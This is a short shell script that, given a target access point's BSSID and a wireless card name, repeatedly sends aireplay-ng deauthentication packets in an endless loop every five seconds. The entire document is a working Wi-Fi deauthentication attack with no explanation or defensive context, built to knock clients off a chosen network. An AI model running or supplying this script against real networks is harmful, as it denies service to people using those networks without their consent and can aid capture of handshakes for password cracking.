#!/bin/sh
echo "target_BSSID: $1"
echo "wifi_card_name: $2"
target_BSSID=$1
wifi_card_name=$2

while true; do
    aireplay-ng -0 1 -a $target_BSSID $wifi_card_name
    sleep 5
done

